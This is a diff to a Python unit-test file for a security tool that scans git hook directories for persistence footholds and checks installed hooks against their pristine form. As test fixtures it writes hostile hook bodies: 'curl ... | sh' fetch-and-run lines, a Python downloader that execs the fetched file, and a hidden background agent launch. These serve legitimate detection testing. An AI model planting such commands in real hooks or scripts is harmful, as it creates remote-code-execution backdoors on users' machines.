@@ -5,6 +5,7 @@ property: the baseline is NEVER trusted for safety (a tampered/absent baseline c
 foothold), grading is deterministic at any -j, and non-regular files are never opened."""
 from __future__ import annotations
 
+import json
 import os
 import plistlib
 import tempfile
@@ -12,6 +13,7 @@ import unittest
 from pathlib import Path
 from unittest import mock
 
+from stayawake.bots.security import hookscript
 from stayawake.bots.security.hygiene import mechanism, models
 from stayawake.bots.security.hygiene.autorun import surface, provenance, grade, baseline, check_autorun
 
@@ -47,6 +49,10 @@ class _Surface(unittest.TestCase):
             "stayawake.bots.security.hygiene.os_service.user_persistence_dirs", return_value=[self.d])
         self.dirs.start()
         self.addCleanup(self.dirs.stop)
+        no_hooks = mock.patch("stayawake.bots.security.hygiene.autorun.surface.git_hook_dirs",
+                              return_value=[])
+        no_hooks.start()
+        self.addCleanup(no_hooks.stop)
 
     def write(self, name: str, **plist):
         (self.d / name).write_bytes(_agent(**plist))
@@ -206,6 +212,180 @@ class TestSurfaceParse(_Surface):
             os.chmod(self.d, 0o700)
         self.assertEqual([i.id for i in issues], ["persistence-surface-unverified"])
         self.assertEqual(issues[0].severity, "unknown")
+
+
+class TestGitHooks(_Surface):
+    """The hooks directories git runs through saw's template are autorun entries."""
+
+    def setUp(self):
+        super().setUp()
+        self.hooks = self.d.parent / "hooks"
+        self.hooks.mkdir()
+        patcher = mock.patch("stayawake.bots.security.hygiene.autorun.surface.git_hook_dirs",
+                             return_value=[self.hooks])
+        patcher.start()
+        self.addCleanup(patcher.stop)
+
+    def _hook(self, name: str, text: str, executable: bool = True) -> Path:
+        p = self.hooks / name
+        p.write_text(text, encoding="utf-8")
+        os.chmod(p, 0o755 if executable else 0o644)
+        return p
+
+    def _run(self, **patches):
+        with mock.patch(f"{_ATTR}._package_owner", return_value=patches.get("owner")), \
+             mock.patch(f"{_ATTR}._homebrew_owner", return_value=None), \
+             mock.patch(f"{_ATTR}._codesigned", return_value=patches.get("signed")):
+            return check_autorun()
+
+    def test_an_executable_hook_is_an_entry_and_a_plain_file_is_not(self):
+        self._hook("post-merge", "#!/bin/sh\nnpx lint-staged\n")
+        self._hook("post-merge.sample", "#!/bin/sh\ncurl -s http://x | sh\n", executable=False)
+        (entries, unread) = surface.enumerate_entries()
+        self.assertEqual([e.path.name for e in entries], ["post-merge"])
+        self.assertEqual(entries[0].argv, [str(self.hooks / "post-merge")])
+        self.assertIn("git-event:post-merge", entries[0].persistence)
+        self.assertEqual(unread, [])
+
+    def test_a_hook_saw_installed_runs_the_saw_it_names(self):
+        self._hook("post-merge", hookscript.render("post-merge", "/opt/my saw$dir/saw", "/home/op/c f.yml"))
+        (e,) = surface.enumerate_entries()[0]
+        self.assertEqual(e.argv, ["/opt/my saw$dir/saw", "hook", "run", "--config", "/home/op/c f.yml",
+                                  "post-merge"])
+
+    def test_the_hooks_saw_installs_are_quiet(self):
+        for event in hookscript.HOOKS:
+            self._hook(event, hookscript.render(event, "/opt/my saw$dir/saw", "/home/op/c f.yml"))
+        self.assertEqual(self._run(), [])
+        self.assertEqual(self._run(), [])
+
+    def test_installing_the_hooks_after_an_audit_is_not_news(self):
+        self.write("ok.plist", ProgramArguments=["/usr/bin/true"], RunAtLoad=True)
+        self.assertEqual(self._run(signed=True), [])
+        for event in hookscript.HOOKS:
+            self._hook(event, hookscript.render(event, "/home/op/.local/bin/saw", None))
+        self.assertEqual(self._run(signed=None), [])
+
+    def test_a_hook_saw_installed_that_was_changed_is_a_foothold(self):
+        for name, text in {
+            "payload": hookscript.render("post-checkout", "/usr/local/bin/saw", None)
+                       .replace("exit 0\n", "curl -s http://x/p | sh\nexit 0\n"),
+            "quiet edit": hookscript.render("post-merge", "/usr/local/bin/saw", None)
+                          .replace("exit 0\n", "echo done\nexit 0\n"),
+            "call redirected": hookscript.render("post-rewrite", "/usr/local/bin/saw", None)
+                               .replace("/usr/local/bin/saw", "/tmp/.x/saw"),
+            "call from a cache path": hookscript.render("post-rewrite", "/usr/local/bin/saw", None)
+                                      .replace("/usr/local/bin/saw", "/home/op/.cache/x/saw"),
+        }.items():
+            (self.hooks / "post-checkout").unlink(missing_ok=True)
+            self._hook("post-checkout", text)
+            issues = self._run()
+            self.assertIn("autorun-unattributed-foothold", self.ids(issues), name)
+            told = {"call redirected": "scratch", "call from a cache path": "cache"}.get(name, "has been modified")
+            self.assertTrue(any(told in i.detail for i in issues), name)
+
+    def test_a_foreign_hook_that_fetches_and_runs_is_a_foothold(self):
+        self._hook("post-checkout", "#!/bin/sh\ncurl -s http://x/p | sh\n")
+        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))
+
+    def test_a_hook_that_sources_a_sibling_is_read_with_it(self):
+        self._hook("post-checkout", '#!/bin/sh\n. "$(dirname "$0")/lib.sh"\nexit 0\n')
+        self._hook("lib.sh", "#!/bin/sh\ncurl -s http://127.0.0.1:9/p | sh\n", executable=False)
+        issues = self._run()
+        self.assertIn("autorun-unattributed-foothold", self.ids(issues))
+        (e,) = [e for e in surface.enumerate_entries()[0] if e.path.name == "post-checkout"]
+        before = e.digest()
+        self._hook("lib.sh", "#!/bin/sh\ncurl -s http://127.0.0.1:9/q | sh\n", executable=False)
+        (e,) = [e for e in surface.enumerate_entries()[0] if e.path.name == "post-checkout"]
+        self.assertNotEqual(e.digest(), before)
+
+    def test_anything_foreign_in_the_directory_saw_manages_is_a_foothold(self):
+        with mock.patch("stayawake.bots.security.hookscript.hooks_dir", return_value=self.hooks):
+            for name, text in {
+                "python": "#!/usr/bin/env python3\nimport subprocess, os\n"
+                          "subprocess.run(['curl', '-s', 'http://127.0.0.1:9/p', '-o', '/tmp/p'])\n"
+                          "os.execv('/bin/sh', ['/bin/sh', '/tmp/p'])\n",
+                "ordinary": "#!/bin/sh\nnpx lint-staged\n",
+                "quiet": "#!/bin/sh\nnohup \"$HOME/.cfg/agent\" &\n",
+            }.items():
+                (self.hooks / "post-checkout").unlink(missing_ok=True)
+                self._hook("post-checkout", text)
+                issues = self._run()
+                self.assertIn("autorun-unattributed-foothold", self.ids(issues), name)
+                self.assertTrue(any("directory saw manages" in i.detail for i in issues), name)
+            (self.hooks / "post-checkout").unlink()
+            for event in hookscript.HOOKS:
+                self._hook(event, hookscript.render(event, "/home/op/.local/bin/saw", None))
+            self.assertEqual(self._run(signed=None), [])
+
+    def test_a_chained_local_hook_is_read_too(self):
+        self._hook("post-merge", hookscript.render("post-merge", "/usr/local/bin/saw", None))
+        self._hook("post-merge.local", "#!/bin/sh\n/tmp/.x/run\n")
+        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))
+
+    def test_an_ordinary_foreign_hook_is_reported_only_when_it_appears_or_changes(self):
+        self._hook("pre-commit", "#!/bin/sh\nnpx lint-staged\n")
+        self.assertEqual(self._run(), [])
+        self.assertEqual(self._run(), [])
+        self._hook("pre-commit", "#!/bin/sh\nnpx lint-staged\nnode ./scripts/check.js\n")
+        issues = self._run()
+        self.assertEqual(self.ids(issues), {"autorun-new-unattributed"})
+        self.assertIn("changed", issues[0].detail)
+
+    @unittest.skipIf(os.getuid() == 0, "root bypasses permission bits")
+    def test_an_unreadable_hooks_dir_is_not_clean(self):
+        os.chmod(self.hooks, 0o000)
+        try:
+            issues = check_autorun()
+        finally:
+            os.chmod(self.hooks, 0o700)
+        self.assertIn("persistence-surface-unverified", self.ids(issues))
+
+
+class TestHookScript(unittest.TestCase):
+    def test_what_saw_installs_is_recognised_and_one_byte_off_is_not(self):
+        for event in hookscript.HOOKS:
+            for saw, cfg in (("/usr/local/bin/saw", None), ("/opt/my saw$dir/saw", "/home/op/c f.yml"),
+                             ("/Users/o'neil/.local/bin/saw", None)):
+                text = hookscript.render(event, saw, cfg)
+                self.assertTrue(hookscript.is_pristine(text), (event, saw, cfg))
+                self.assertFalse(hookscript.is_pristine(text + "\n"), (event, saw, cfg))
+                self.assertFalse(hookscript.is_pristine(text.replace("|| true", "|| sh")), (event, saw))
+        crossed = hookscript.render("post-merge", "/usr/local/bin/saw", None).replace(
+            'post-merge "$@"', 'post-checkout "$@"')
+        self.assertFalse(hookscript.is_pristine(crossed))
+
+    def test_the_hook_dirs_are_the_templates_and_the_seeded_repositories(self):
+        home = Path(tempfile.mkdtemp(prefix="hookdirs-"))
+        self.addCleanup(lambda: __import__("shutil").rmtree(home, ignore_errors=True))
+        repo = home / "proj"
+        (repo / ".git" / "hooks").mkdir(parents=True)
+        cache = home / ".cache" / "saw" / "hook-scan-cache.json"
+        cache.parent.mkdir(parents=True)
+        cache.write_text(json.dumps({str(repo): "abc", "relative/path": "def",
+                                     str(home / "deleted-long-ago"): "0ld"}))
+        with mock.patch.dict(os.environ, {"XDG_CONFIG_HOME": str(home / ".config"),
+                                          "XDG_CACHE_HOME": str(home / ".cache")}), \
+             mock.patch("stayawake.bots.security.hookscript.global_template_dir",
+                        return_value=str(home / "operator-template")):
+            dirs = hookscript.hook_dirs()
+        self.assertEqual(dirs, [home / ".config" / "saw" / "git-template" / "hooks",
+                                home / "operator-template" / "hooks",
+                                repo / ".git" / "hooks"])
+
+    def test_a_repository_that_redirects_its_hooks_is_read_where_git_reads_it(self):
+        home = Path(tempfile.mkdtemp(prefix="hookdirs-"))
+        self.addCleanup(lambda: __import__("shutil").rmtree(home, ignore_errors=True))
+        repo = home / "proj"
+        repo.mkdir()
+        import subprocess
+        subprocess.run(["git", "-C", str(repo), "init", "-q"], check=True)
+        subprocess.run(["git", "-C", str(repo), "config", "core.hooksPath", ".husky/_"], check=True)
+        self.assertEqual(hookscript.repository_hooks_dir(repo), repo / ".husky/_")
+        subprocess.run(["git", "-C", str(repo), "config", "core.hooksPath", "/tmp/.x/hooks"], check=True)
+        self.assertEqual(hookscript.repository_hooks_dir(repo), Path("/tmp/.x/hooks"))
+        subprocess.run(["git", "-C", str(repo), "config", "--unset", "core.hooksPath"], check=True)
+        self.assertEqual(hookscript.repository_hooks_dir(repo), repo / ".git" / "hooks")
 
 
 class TestProvenance(unittest.TestCase):
